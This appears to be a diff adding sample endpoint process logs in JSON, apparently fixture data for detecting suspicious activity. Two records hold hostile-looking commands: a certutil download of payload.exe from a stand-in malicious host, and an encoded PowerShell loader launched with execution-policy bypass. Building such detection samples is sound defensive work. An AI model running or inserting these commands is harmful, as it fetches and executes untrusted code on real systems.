@@ -1,0 +1,20 @@
+[
+    {
+        "Timestamp": "2026-02-28T10:15:30Z",
+        "HostName": "WORKSTATION-01",
+        "ProcessName": "chrome.exe",
+        "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""
+    },
+    {
+        "Timestamp": "2026-02-28T10:18:45Z",
+        "HostName": "WORKSTATION-01",
+        "ProcessName": "certutil.exe",
+        "CommandLine": "certutil.exe -urlcache -split -f http://malicious-site.com/payload.exe C:\\Temp\\payload.exe"
+    },
+    {
+        "Timestamp": "2026-02-28T11:05:10Z",
+        "HostName": "SERVER-DB",
+        "ProcessName": "powershell.exe",
+        "CommandLine": "powershell.exe -ExecutionPolicy Bypass -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA"
+    }
+]
